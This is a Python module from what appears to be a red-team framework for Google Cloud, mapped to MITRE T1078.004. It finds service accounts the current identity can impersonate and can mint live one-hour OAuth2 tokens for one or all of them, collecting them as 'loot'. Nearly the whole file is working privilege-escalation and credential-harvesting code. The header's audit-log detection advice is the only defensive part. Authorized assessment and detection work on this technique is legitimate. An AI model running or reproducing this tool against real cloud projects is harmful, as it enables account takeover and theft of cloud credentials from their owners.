# ================================================================
# TECHNIQUE: escalation/gcp_sa_token_creator
# ----------------------------------------------------------------
# TACTIC:    Privilege Escalation (TA0004)
# MITRE:     T1078.004 — Cloud Accounts
#
# PURPOSE:
#   Phase 1 (default): Enumerate all service accounts the current
#   principal can impersonate via roles/iam.serviceAccountTokenCreator.
#
#   Phase 2 (--param impersonate=<email|all>): Call GenerateAccessToken
#   against a specific SA or every discovered SA, returning short-lived
#   OAuth2 tokens the operator can use immediately.
#
# USAGE (interactive shell):
#   # Discovery only — shows which SAs you can impersonate
#   run escalation/gcp_sa_token_creator
#
#   # Generate a token for a specific SA
#   run escalation/gcp_sa_token_creator --param impersonate=qm-chaos-runner@project.iam.gserviceaccount.com
#
#   # Generate tokens for every SA you can impersonate
#   run escalation/gcp_sa_token_creator --param impersonate=all
#
# PROVIDERS: gcp
#
# DETECTION (GCP):
#   Cloud Audit Logs: iam.googleapis.com/GenerateAccessToken — Admin Activity.
#   Alert on GenerateAccessToken where caller != expected automation SA.
#   Token usage by the impersonated SA also logs with callerSuppliedUserAgent.
#
# REFERENCES:
#   https://cloud.google.com/iam/docs/creating-short-lived-service-account-credentials
#
# SAFE:      No — GenerateAccessToken is an active API call (audit-logged)
# ================================================================

import json
from datetime import UTC
from typing import Any

import google.auth.impersonated_credentials as _imp
import google.auth.transport.requests as _tr

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import technique

# ----------------------------------------------------------------
# Loot schema — CloudFox-style output (loot.csv / table.txt)
# ----------------------------------------------------------------
LOOT_ITEMS_KEY = "findings"
LOOT_SCHEMA = [
    ("target_sa",  "target_sa"),
    ("project",    "project"),
    ("method",     "method"),
    ("token",      "token"),
    ("expires_at", "expires_at"),
    ("notes",      None),
]

try:
    from google.cloud import iam_admin_v1, resourcemanager_v3
except ImportError:
    resourcemanager_v3 = None  # type: ignore[assignment]
    iam_admin_v1 = None  # type: ignore[assignment]


def format_token_creator_result(result: Any) -> None:
    """Decentralized formatter for service account token creator."""
    from rich import box
    from rich.table import Table

    from quantum_mechanic.shell.formatters import console

    data = result.data
    findings = data.get("findings", [])

    if data.get("status") == "error":
        console.print(f"  [bold red]✗[/bold red] {data.get('error', 'Unknown error')}")
        if findings:
            console.print("  [dim]Partial results below:[/dim]")
        else:
            return

    if not findings:
        console.print(
            "  [bold green]✓[/bold green] [dim]No service accounts found that you can impersonate.[/dim]"
        )
        return

    any_tokens = any(f.get("token") for f in findings)

    console.print(
        f"  [bold red]⚠  PRIVILEGE ESCALATION PATH FOUND[/bold red]  "
        f"[dim]({len(findings)} service account(s) you can impersonate)[/dim]"
    )
    console.print(
        "  [dim]Your principal has [bold]roles/iam.serviceAccountTokenCreator[/bold] — "
        "you can act as these SAs for up to 1 hour.[/dim]\n"
    )

    # ── Discovery table ──────────────────────────────────────────
    tbl = Table(box=box.ROUNDED, border_style="red")
    tbl.add_column("Target Service Account", style="bold yellow")
    tbl.add_column("Project", style="dim")
    tbl.add_column("Your Rights", style="red")
    if any_tokens:
        tbl.add_column("Expires At", style="dim")
        tbl.add_column("Token (first 40 chars)", style="green")
    else:
        tbl.add_column("Next Step", style="cyan")

    for f in findings:
        sa = f.get("target_sa", "?")
        project = f.get("project", "?")
        method = f.get("method", "?")

        if any_tokens:
            token = f.get("token") or ""
            expires = f.get("expires_at") or f.get("token_error") or "—"
            token_preview = (token[:40] + "…") if token else "[dim]not generated[/dim]"
            tbl.add_row(sa, project, method, expires, token_preview)
        else:
            next_step = f"--param impersonate={sa}"
            tbl.add_row(sa, project, method, next_step)

    console.print(tbl)

    if not any_tokens:
        console.print(
            "\n  [dim]To generate a live token: "
            "[bold]run escalation/gcp_sa_token_creator --param impersonate=<sa_email>[/bold][/dim]"
        )
        console.print(
            "  [dim]Or impersonate all at once: "
            "[bold]run escalation/gcp_sa_token_creator --param impersonate=all[/bold][/dim]\n"
        )


@technique(
    technique_id="escalation/gcp_sa_token_creator",
    tactic="privilege_escalation",
    mitre_id="T1078.004",
    providers=["gcp"],
    severity="high",
    safe=False,
    safe_mode_available=False,
    description=(
        "Enumerate and optionally exploit serviceAccountTokenCreator rights. "
        "Use --param impersonate=<email|all> to generate live OAuth2 tokens."
    ),
    formatter=format_token_creator_result,
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """
    Phase 1: discover which SAs the caller can impersonate.
    Phase 2 (--param impersonate=<email|all>): generate an OAuth2 token
    for one or all discovered SAs via IAM Credentials GenerateAccessToken.
    """
    if ctx.provider_name != "gcp":
        return {"status": "error", "error": "Not implemented for this provider."}

    whoami_res = ctx.whoami()
    if whoami_res.principal_type == "unknown":
        return {"status": "error", "error": "Could not determine principal. Cannot enumerate IAM."}

    # ── Phase 1: discover impersonatable SAs ─────────────────────
    findings = _discover(ctx, whoami_res)

    # ── Phase 2: optionally generate tokens ──────────────────────
    impersonate_param = ctx.params.get("impersonate", "").strip().lower()

    if impersonate_param:
        targets: list[str] = []

        if impersonate_param == "all":
            targets = [f["target_sa"] for f in findings]
        else:
            # Validate the requested SA is in the discovered list
            all_sas = {f["target_sa"].lower() for f in findings}
            requested = ctx.params["impersonate"].strip()
            if requested.lower() not in all_sas:
                return {
                    "status": "error",
                    "error": (
                        f"SA '{requested}' not found in impersonatable list. "
                        f"Run without --param first to see available targets."
                    ),
                    "findings": findings,
                }
            targets = [requested]

        # Generate tokens and merge into findings
        for finding in findings:
            if finding["target_sa"] in targets:
                token_result = _generate_token(ctx, finding["target_sa"])
                finding.update(token_result)

    return {"status": "success", "findings": findings}


# ================================================================
# Internal helpers
# ================================================================

def _discover(ctx: ExecutionContext, whoami_res: Any) -> list[dict[str, Any]]:
    """Enumerate all SAs the current principal has Token Creator rights on."""
    if resourcemanager_v3 is None or iam_admin_v1 is None:
        ctx.log("google-cloud-resource-manager or google-cloud-iam not installed.")
        return []

    principal_id = whoami_res.principal_id
    member_str = (
        f"serviceAccount:{principal_id}"
        if whoami_res.principal_type == "service_account"
        else f"user:{principal_id}"
    )

    rm_client = resourcemanager_v3.ProjectsClient(credentials=ctx.session)
    iam_client = iam_admin_v1.IAMClient(credentials=ctx.session)

    projects: list[str] = []
    try:
        for p in rm_client.search_projects():
            projects.append(p.project_id)
    except Exception as e:
        ctx.log(f"Could not list projects: {e}. Falling back to account_id.")
        if whoami_res.account_id and whoami_res.account_id != "unknown":
            projects.append(whoami_res.account_id)

    findings: list[dict[str, Any]] = []

    for pid in set(projects):
        try:
            policy = rm_client.get_iam_policy(request={"resource": f"projects/{pid}"})

            project_level = False
            for binding in policy.bindings:
                if binding.role in {
                    "roles/iam.serviceAccountTokenCreator",
                    "roles/editor",
                    "roles/owner",
                } and member_str in binding.members:
                    project_level = True
                    break

            for sa in iam_client.list_service_accounts(request={"name": f"projects/{pid}"}):
                can_impersonate = project_level

                if not can_impersonate:
                    try:
                        sa_policy = iam_client.get_iam_policy(request={"resource": sa.name})
                        for binding in sa_policy.bindings:
                            if binding.role == "roles/iam.serviceAccountTokenCreator":
                                if member_str in binding.members:
                                    can_impersonate = True
                                    break
                    except Exception:
                        pass

                if can_impersonate:
                    finding: dict[str, Any] = {
                        "target_sa": sa.email,
                        "project":   pid,
                        "method":    "roles/iam.serviceAccountTokenCreator",
                        "token":     None,
                        "expires_at": None,
                    }
                    findings.append(finding)
                    ctx.workspace.add_finding(
                        technique_id=ctx.technique_id,
                        tactic="privilege_escalation",
                        mitre_id="T1078.004",
                        title=f"Impersonatable GCP Service Account: {sa.email}",
                        severity="high",
                        provider="gcp",
                        description=(
                            f"Principal {member_str} has Token Creator rights over "
                            f"{sa.email}, enabling full impersonation via short-lived "
                            f"access tokens."
                        ),
                        evidence=json.dumps(finding, indent=2),
                    )

        except Exception as e:
            ctx.log(f"Error enumerating project {pid}: {e}")

    return findings


def _generate_token(ctx: ExecutionContext, sa_email: str) -> dict[str, Any]:
    """Call IAM Credentials GenerateAccessToken for the target SA.

    Returns a dict with 'token' and 'expires_at' keys to merge into the finding.
    """
    try:
        # Build impersonated credentials from the current session
        impersonated = _imp.Credentials(
            source_credentials=ctx.session,
            target_principal=sa_email,
            target_scopes=["https://www.googleapis.com/auth/cloud-platform"],
            lifetime=3600,
        )
        impersonated.refresh(_tr.Request())

        expiry_str = (
            impersonated.expiry.replace(tzinfo=UTC).isoformat()
            if impersonated.expiry else "unknown"
        )
        ctx.log(f"Token generated for {sa_email} — expires {expiry_str}")
        return {
            "token":      impersonated.token,
            "expires_at": expiry_str,
        }

    except Exception as e:
        ctx.log(f"GenerateAccessToken failed for {sa_email}: {e}")
        return {
            "token":      None,
            "expires_at": None,
            "token_error": str(e),
        }
